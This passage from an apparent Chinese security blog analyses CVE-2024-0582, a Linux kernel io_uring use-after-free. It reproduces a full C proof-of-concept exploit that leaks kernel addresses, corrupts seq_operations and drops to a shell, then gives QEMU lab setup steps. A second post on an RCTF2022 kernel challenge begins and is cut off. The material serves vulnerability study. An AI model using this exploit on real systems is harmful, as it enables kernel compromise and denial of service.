<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">io_pbuf_get_address</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> <span class="type">long</span> bgid)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>;</span></span><br><span class="line"></span><br><span class="line">	bl = io_buffer_get_list(ctx, bgid);</span><br><span class="line">	<span class="keyword">if</span> (!bl || !bl-&gt;is_mmap)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bl-&gt;buf_ring;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">io_uring_validate_mmap_request</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">					    <span class="type">loff_t</span> pgoff, <span class="type">size_t</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="type">loff_t</span> offset = pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (offset &amp; IORING_OFF_MMAP_MASK) &#123;</span><br><span class="line">	<span class="keyword">case</span> IORING_OFF_SQ_RING:</span><br><span class="line">	<span class="keyword">case</span> IORING_OFF_CQ_RING:</span><br><span class="line">		ptr = ctx-&gt;rings;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IORING_OFF_SQES:</span><br><span class="line">		ptr = ctx-&gt;sq_sqes;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IORING_OFF_PBUF_RING: &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> bgid;</span><br><span class="line"></span><br><span class="line">		bgid = (offset &amp; ~IORING_OFF_MMAP_MASK) &gt;&gt; IORING_OFF_PBUF_SHIFT;</span><br><span class="line">		mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		ptr = io_pbuf_get_address(ctx, bgid);</span><br><span class="line">		mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		<span class="keyword">if</span> (!ptr)</span><br><span class="line">			<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	page = virt_to_head_page(ptr);</span><br><span class="line">	<span class="keyword">if</span> (sz &gt; page_size(page))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>当我们将 bl-&gt;buf_ring 的内存通过 mmap() 映射出去后，仍然可以通过 io_unregister_pbuf_ring 函数将这块内存释放掉，因此可以先进行内存分配，再 mmap，最后再释放这块内存就直接有一个 UAF：可以通过 mmap 的内存区域直接读写释放掉的内存页。</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>这里直接 copy 了 a3 的 poc：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> IS_ERR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PTR_ERR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESSS_MSG(msg) <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg) <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_MSG(msg) <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(INFO_MSG(<span class="string">&quot;[*] Process binded to core: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> io_uring_buf_ring*</span><br><span class="line"><span class="title function_">setup_pbuf_ring_mmap</span><span class="params">(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> <span class="type">int</span> ring_entries,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> bgid, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">int</span> *retp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_ring</span> *<span class="title">buf_ring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">buf_reg</span>;</span></span><br><span class="line">    <span class="type">size_t</span> ring_size;</span><br><span class="line">    <span class="type">off_t</span> offset;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf_reg, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_reg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span></span><br><span class="line">    buf_reg.ring_entries = ring_entries;</span><br><span class="line">    buf_reg.bgid = bgid;</span><br><span class="line">    buf_reg.flags = IOU_PBUF_RING_MMAP;</span><br><span class="line"></span><br><span class="line">    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));</span><br><span class="line">        *retp = ret;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> [chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    offset = IORING_OFF_PBUF_RING | (<span class="type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;</span><br><span class="line">    ring_size = ring_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf);</span><br><span class="line">    buf_ring = mmap(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        ring_size,</span><br><span class="line">        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,</span><br><span class="line">        ring-&gt;ring_fd,</span><br><span class="line">        offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(buf_ring)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));</span><br><span class="line">        *retp = PTR_ERR(buf_ring);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *retp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> buf_ring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_PAGES    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_BUFFERS  0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_FILE_NR 0x200</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proof_of_concept</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">    <span class="type">void</span> **buffers;</span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_FILE_NR], found = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(SUCCESSS_MSG(<span class="string">&quot;-------- CVE-2024-0582 Proof-of-concet --------&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(INFO_MSG(<span class="string">&quot;-------\t\t Author: &quot;</span>) <span class="string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="string">&quot; \t-------&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(SUCCESSS_MSG(<span class="string">&quot;-----------------------------------------------\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Preparing...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(<span class="number">4</span>, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERR_MSG(<span class="string">&quot;[x] Unable to init for io_uring queue&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating pbuf ring and doing mmap()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buffers = <span class="built_in">calloc</span>(NR_BUFFERS, <span class="keyword">sizeof</span>(<span class="type">void</span>*));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        buffers[i] = setup_pbuf_ring_mmap(</span><br><span class="line">            &amp;ring,</span><br><span class="line">            NR_PAGES * PAGE_SIZE / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf),</span><br><span class="line">            i,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            &amp;ret</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to set up&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pbuf ring, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        io_uring_buf_ring_init(buffers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering page-level UAF vulnerabilities...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        ret = io_uring_unregister_buf_ring(&amp;ring, i);</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to unregister&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pbuf ring, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reallocating page into seq_file::seq_operations...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to open&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;seq file, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                seq_fd[i]</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking data leak and overwriting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> *buffer = buffers[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (buffer[j]&gt;<span class="number">0xffffffff80000000</span> &amp;&amp; buffer[j]&lt;<span class="number">0xfffffffff0000000</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    SUCCESSS_MSG(<span class="string">&quot;[+] Got kernel data leak:&quot;</span>) <span class="string">&quot; %lx &quot;</span></span><br><span class="line">                    SUCCESSS_MSG(<span class="string">&quot;at location &quot;</span>) <span class="string">&quot;%d-%d\n&quot;</span>,</span><br><span class="line">                    buffer[j],</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                buffer[j] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Failed to reallocate UAF page as seq_operations!&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering kernel panic...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">        read(seq_fd[i], buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[?] So you&#x27;re still alive here!?&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    proof_of_concept();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里我们选择 linux-6.4.16 内核源码进行编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.4.16.tar.xz</span><br><span class="line">unxz linux-6.4.16.tar.xz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">choose config, all default is good</span></span><br><span class="line">make menuconfig</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有一个证书功能的报错：<a href="https://blog.csdn.net/m0_47696151/article/details/121574718">https://blog.csdn.net/m0_47696151/article/details/121574718</a><br>另外 gcc 版本不要太新（arch 复现环境的痛 XD，在服务器上 gcc 11.1 可以成功编译）</p>
<p>使用 busybox 来搭建基本文件系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.36.0.tar.bz2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`Settings` ---&gt; `Build static binary file (no shared lib)` to compile static busybox</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可选项：在 Linux System Utilities 中取消选中 Support mounting NFS file systems on Linux &lt;2.6.23 (NEW)；在 Networking Utilities 中取消选中 inetd。</span></span><br><span class="line">make menuconfig</span><br><span class="line">make -j$(nproc) </span><br><span class="line">make install</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配置文件系统，在编译生成的 _install 目录下创建基本的文件系统结构</p>
<h3 id="配置文件系统-¶"><a href="#配置文件系统-¶" class="headerlink" title="配置文件系统 ¶"></a>配置文件系统 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3" title="Permanent link">¶</a></h3><p>我们首先在 <code>_install</code> 目录下创建基本的文件系统结构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,dev,home/ctf,root,tmp,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line">touch etc/inittab</span><br><span class="line">mkdir etc/init.d</span><br><span class="line">touch etc/init.d/rcS</span><br><span class="line">chmod +x ./etc/init.d/rcS</span><br></pre></td></tr></table></figure>


<p>在我们创建的 <code>./etc/inittab</code> 中写入如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/login</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>在上面的文件中指定了系统初始化脚本为 <code>etc/init.d/rcS</code>，因此接下来我们配置这个文件写入如下内容，主要是挂载各种文件系统，以及设置各目录的权限，并创建一个非特权用户：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">chown -R root:root /</span><br><span class="line">chmod 700 /root</span><br><span class="line">chown -R ctf:ctf /home/ctf</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">cd /home/ctf</span><br><span class="line">su ctf -c sh</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>&#96;</p>
<p>然后为这个脚本添加可执行权限，该脚本通常用作我们自定义的环境初始化脚本：<br><code>chmod +x ./etc/init.d/rcS</code></p>
<p>接下来我们配置用户组相关权限，在这里建立了两个用户组 <code>root</code> 和 <code>ctf</code> ，以及两个用户 <code>root</code> 和 <code>ctf</code>，并配置了一条文件系统挂载项：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;root:x:0:0:root:/root:/bin/sh&quot; &gt; etc/passwd </span><br><span class="line">echo &quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot; &gt;&gt; etc/passwd</span><br><span class="line">echo &quot;root:x:0:&quot; &gt; etc/group</span><br><span class="line">echo &quot;ctf:x:1000:&quot; &gt;&gt; etc/group </span><br><span class="line">echo &quot;none /dev/pts devpts gid=5,mode=620 0 0&quot; &gt; etc/fstab`</span><br></pre></td></tr></table></figure>

<p>打包文件系统<br>按 cpio 格式打包即可，最后设置启动脚本如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span> </span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 128M \</span><br><span class="line">	-kernel ./bzImage \ </span><br><span class="line">	-initrd ./rootfs.cpio \ </span><br><span class="line">	-monitor /dev/null \ </span><br><span class="line">	-append &quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot; \ </span><br><span class="line">	-cpu kvm64,+smep \ </span><br><span class="line">	-smp cores=2,threads=1 \ </span><br><span class="line">	-nographic \ </span><br><span class="line">	-snapshot \ </span><br><span class="line">	-s</span><br></pre></td></tr></table></figure>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/">CTF-Wiki: 内核源码下载与编译</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">CTF-Wiki: 搭建内核运行环境</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>RCTF2022 game学习</title>
    <url>/posts/3316df56.html</url>
    <content><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>使用 vmlinux-to-elf 工具转 bzImage 可以得到内核版本信息 6.0.12<br>查看启动脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export KERNEL=.</span><br><span class="line">export IMAGE=.</span><br><span class="line">echo &quot;start&quot;</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel $KERNEL/bzImage \</span><br><span class="line">-nographic \</span><br><span class="line">-append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">-initrd $IMAGE/rootfs.cpio \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=1,threads=1 \</span><br><span class="line">-cpu kvm64,smep,smap</span><br></pre></td></tr></table></figure>
<p>开启了 kaslr, smep, smap 保护，查看 &#x2F;proc&#x2F;cpuinfo 可以看到开启 kpti 保护。<br>解包文件系统，查看 init 脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">insmod /RCTF2022.ko</span><br><span class="line">chmod 666 /dev/game</span><br><span class="line">chown root:root /flag</span><br><span class="line">chmod 600 /flag</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>加载 RCTF2022.ko 内核模块，对应设备文件 &#x2F;dev&#x2F;game</p>
<h2 id="RCTF2022源码分析"><a href="#RCTF2022源码分析" class="headerlink" title="RCTF2022源码分析"></a>RCTF2022源码分析</h2><p>该内核提供了内核模块对应源码，创建了字符设备 game，定义了 open, read, release, ioctl 四个操作。</p>
<h3 id="hhoge-open-函数："><a href="#hhoge-open-函数：" class="headerlink" title="hhoge_open 函数："></a>hhoge_open 函数：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Maind* <span class="title function_">initMaind</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Maind</span> *<span class="title">fc</span>;</span></span><br><span class="line">	fc = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Maind), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!fc)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> fc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hhoge_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Maind</span>* <span class="title">context</span> =</span> initMaind();</span><br><span class="line">	<span class="keyword">if</span>(context==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		printk(<span class="string">&quot;g_context fail&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>  -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	file-&gt;private_data = context;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>初始化 Maind 结构体并赋值给 file-&gt;private_data 。其中 Maind 结构体内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Maind</span>&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> id;</span><br><span class="line">	<span class="type">char</span> username[<span class="number">0x20</span>];</span><br><span class="line">	<span class="type">void</span> *cur;</span><br><span class="line">	<span class="type">void</span> *prv;</span><br><span class="line">	<span class="type">int</span> random;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="hhoge-read-函数"><a href="#hhoge-read-函数" class="headerlink" title="hhoge_read 函数"></a>hhoge_read 函数</h3><p>读取 file-&gt;private_data 数据返回到用户空间：</p>
